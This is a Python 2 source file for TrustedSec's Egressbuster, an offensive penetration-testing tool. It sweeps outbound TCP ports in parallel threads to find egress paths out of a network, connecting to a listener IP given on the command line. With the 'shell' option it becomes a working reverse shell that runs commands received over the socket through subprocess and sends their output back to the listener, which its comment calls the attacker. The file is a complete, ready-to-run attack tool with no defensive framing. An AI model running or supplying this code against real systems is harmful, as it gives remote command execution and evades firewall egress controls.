#!/usr/bin/python
#
# TrustedSec Egressbuster Reverse Shell
#
# Written by Dave Kennedy (ReL1K)
#
# This is the actual egressbuster that will connect out from a network to the listener then spawn a shell
#
# Visit: https://www.trustedsec.com - Click on the downloads section for more.
#
import os
import socket
import subprocess
import sys
import thread
import time
import socket


# How long to wait before making the next request (in seconds)
sleep = 0.01
# How long to wait before a connection is seen as invalid (in seconds)
timeout = 3
# How many threads that can be active at once
max_threads = 500
# Display more output
verbose = False


# try to import
try:
    ipaddr = sys.argv[1]

except IndexError:
    print """

        TrustedSec, LLC
   https://www.trustedsec.com

Quick egress buster reverse shell
Written by: Dave Kennedy (ReL1K) (@HackingDave)
A TrustedSec Project

NOTE: Supports all 65536 TCP ports.

Usage: $ egressbuster.py <listener_ip_address> <lowport-highport> (optional_flag_shell)

Note that the last flag is optional. If you want a shell to spawn when a port
is detected, simply type 'shell' as the optional flag.

Example: $ egressbuster.py 10.9.5.2 1-65536 shell
        """
    sys.exit()


def start_socket(ipaddr, base_port, shell):
    global num_threads

    # increase thread count
    num_threads += 1

    if verbose or (base_port % 1000) == 0:
        print "[v] Trying: TCP %s" % base_port

    # try block to catch exceptions
    try:
        socket.setdefaulttimeout(timeout)
        sockobj = socket.socket()
        sockobj.connect((ipaddr, base_port))
        sockobj.send(str(base_port))
        sockobj.send('')
        print "[*] Connection made to %s on port: %s/tcp" % (ipaddr, base_port)
        if shell == "shell":
            # start loop
            while 1:
                # receive shell command
                data = sockobj.recv(1024)
                # if its quit, then break out and close socket
                if data == "quit":
                    break
                # do shell command
                if data.startswith("cd "):
                    data = data.replace("cd ", "")
                    cwd = os.getcwd()
                    if os.path.isdir(cwd + data):
                        if data != "/":
                            data = cwd + data

                    if os.path.isdir(data):
                        print data
                        os.chdir(data)
                        stdout_value = "Changed directory."

                    else:
                        stdout_value = "Invalid directory. Be sure to use full pathnames to change directories. Not individual directories."

                else:
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    # read output
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    # send output to attacker

                sockobj.send(stdout_value)
        # close socket
        sockobj.close()

    # if we throw an error
    except timeout:
        sockobj.close()
        if verbose:
            print "[v] Can't use port: %s/tcp" % base_port

#    except Exception,e :
#		print e
#    pass through, ports closed
#       pass

    finally:
        num_threads -= 1
        return


# Defining default values
num_threads = 0
shell = ""
portrange = ""
lowport = 1
highport = 1024

try:
    portrange = sys.argv[2]
    shell = sys.argv[3]
except:
    pass

if portrange:
    portrange = portrange.split("-")
    lowport = int(portrange[0])
    highport = int(portrange[1])

# cycle through ranges
base_port = int(lowport)
end_port = int(highport)

if end_port > 65536:
    print "[i] Limiting to TCP 65536..."
    end_port = 65536

print "[i] Sending packets to egress listener (%s)..." % ipaddr
print "[i] Starting at: %s/tcp, ending at: %s/tcp" % (base_port, end_port)

while base_port <= end_port:
    thread.start_new_thread(start_socket, (ipaddr, base_port, shell))
    time.sleep(sleep)

    while num_threads >= max_threads:
        # Lower timeout value, increase max_threads or wait it out...
        print "[!] On hold. max_threads limit reached (%s)" % (num_threads)
        time.sleep(timeout)

    base_port += 1

print "[*] All packets have been sent"

while num_threads > 0:
    print "[i] Remaining threads: %s" % num_threads
    time.sleep(2)

print "[*] Done"
